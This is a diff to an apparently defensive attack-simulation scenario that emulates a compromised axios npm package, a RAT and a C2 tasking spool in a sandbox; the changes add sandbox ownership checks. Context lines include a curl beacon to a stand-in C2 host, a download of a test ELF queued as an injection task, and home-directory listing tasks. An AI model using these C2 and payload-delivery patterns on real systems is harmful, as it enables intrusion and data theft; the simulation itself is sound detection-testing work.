@@ -250,15 +250,15 @@ steps:
         *) echo "[CortexSim] refuse: sandbox root must be /var/tmp/.cortexsim-axios" >&2; exit 2 ;;
       esac
       # A RAT left by an earlier run is ended before its sandbox is replaced.
-      if [ -f "$R/run/ld.pid" ] && grep -q cortexsim-axios "/proc/$(cat "$R/run/ld.pid")/cmdline" 2>/dev/null; then
+      if [ "$(stat -c %F:%u:%a "$R" 2>/dev/null)" = "directory:$(id -u):700" ] && [ -f "$R/run/ld.pid" ] && grep -q cortexsim-axios "/proc/$(cat "$R/run/ld.pid")/cmdline" 2>/dev/null; then
         kill "$(cat "$R/run/ld.pid")" 2>/dev/null || true
       fi
       rm -rf "$R"
+      mkdir -m 700 "$R"
       P="$R/proj/node_modules/plain-crypto-js"
       mkdir -p "$R/proj/node_modules/axios" "$P" "$R/tmp" "$R/run"
       mkdir -p "$R/c2/tasking.d" "$R/c2/results.d" "$R/c2/outbox"
       mkdir -p "$R/home/dev/.config" "$R/home/dev/Documents" "$R/home/dev/Desktop"
-      chmod 700 "$R"
       # Victim project. Lab stand-ins: no registry URL and no integrity hash.
       cat > "$R/proj/package.json" <<'EOF'
       {"name": "cortexsim-demo-app", "version": "1.0.0", "private": true, "dependencies": {"axios": "1.14.1"}}
@@ -367,6 +367,7 @@ steps:
       set -eu
       sleep 40   # dwell: back-to-back steps lost telemetry in this lab (2026-11-11)
       R=/var/tmp/.cortexsim-axios
+      [ "$(stat -c %F:%u:%a "$R" 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox $R is missing or not ours: step-01 did not complete" >&2; exit 1; }
       U=http://axios-c2.cortexsim-canary.invalid:8000/6202033
       curl -o "$R/tmp/ld.py" -d packages.npm.org/product2 -s --max-time 3 --noproxy '*' "$U" || true
       cat > "$R/tmp/ld.py" <<'PYRAT'
@@ -653,6 +654,7 @@ steps:
       set -eu
       sleep 40   # dwell
       R=/var/tmp/.cortexsim-axios
+      [ "$(stat -c %F:%u:%a "$R" 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox $R is missing or not ours: step-01 did not complete" >&2; exit 1; }
       U=http://axios-c2.cortexsim-canary.invalid:8000/6202033
       alive() { kill -0 "$1" 2>/dev/null && ! grep -q '^State:[[:space:]]*Z' "/proc/$1/status" 2>/dev/null; }
       expr "$(date +%s)" + 900 > "$R/run/expires-at"
@@ -707,6 +709,8 @@ steps:
       # REAL unlink and rename.
       set -eu
       sleep 40   # dwell
+      R=/var/tmp/.cortexsim-axios
+      [ "$(stat -c %F:%u:%a "$R" 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox $R is missing or not ours: step-01 did not complete" >&2; exit 1; }
       P=/var/tmp/.cortexsim-axios/proj/node_modules/plain-crypto-js
       test -f "$P/setup.js"
       rm -f "$P/setup.js"
@@ -755,6 +759,7 @@ steps:
       set -eu
       sleep 40   # dwell
       R=/var/tmp/.cortexsim-axios
+      [ "$(stat -c %F:%u:%a "$R" 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox $R is missing or not ours: step-01 did not complete" >&2; exit 1; }
       # Each task is written under a temporary name, then renamed into the spool.
       printf '{"type":"rundir","Paths":["%s","%s","%s","%s"]}\n' "$R/home/dev" "$R/home/dev/.config" "$R/home/dev/Documents" "$R/home/dev/Desktop" > "$R/c2/tasking.d/.001"
       mv "$R/c2/tasking.d/.001" "$R/c2/tasking.d/001.json"
@@ -824,6 +829,7 @@ steps:
       set -eu
       sleep 40   # dwell
       R=/var/tmp/.cortexsim-axios
+      [ "$(stat -c %F:%u:%a "$R" 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox $R is missing or not ours: step-01 did not complete" >&2; exit 1; }
       curl -fsSL --max-time 45 https://wildfire.paloaltonetworks.com/publicapi/test/elf -o "$R/c2/payload.bin"
       sha256sum "$R/c2/payload.bin"
       { printf '{"type":"peinject","Param":"","Payload":"'; base64 -w0 "$R/c2/payload.bin"; printf '"}\n'; } > "$R/c2/tasking.d/.003"
@@ -888,6 +894,7 @@ steps:
       set -eu
       sleep 40   # dwell
       R=/var/tmp/.cortexsim-axios
+      [ "$(stat -c %F:%u:%a "$R" 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox $R is missing or not ours: step-01 did not complete" >&2; exit 1; }
       alive() { kill -0 "$1" 2>/dev/null && ! grep -q '^State:[[:space:]]*Z' "/proc/$1/status" 2>/dev/null; }
       printf '{"type":"kill"}\n' > "$R/c2/tasking.d/.004"
       mv "$R/c2/tasking.d/.004" "$R/c2/tasking.d/004.json"
@@ -929,7 +936,7 @@ steps:
 
 cleanup:
   commands:
-    - "if [ -f /var/tmp/.cortexsim-axios/run/ld.pid ] && grep -q cortexsim-axios \"/proc/$(cat /var/tmp/.cortexsim-axios/run/ld.pid)/cmdline\" 2>/dev/null; then kill \"$(cat /var/tmp/.cortexsim-axios/run/ld.pid)\" 2>/dev/null; fi"
+    - "if [ \"$(stat -c %F:%u:%a /var/tmp/.cortexsim-axios 2>/dev/null)\" = \"directory:$(id -u):700\" ] && [ -f /var/tmp/.cortexsim-axios/run/ld.pid ] && grep -q cortexsim-axios \"/proc/$(cat /var/tmp/.cortexsim-axios/run/ld.pid)/cmdline\" 2>/dev/null; then kill \"$(cat /var/tmp/.cortexsim-axios/run/ld.pid)\" 2>/dev/null; fi"
     - "rm -rf /var/tmp/.cortexsim-axios"
     - "echo 'cortexsim-koi-012-cleanup-complete'"
 
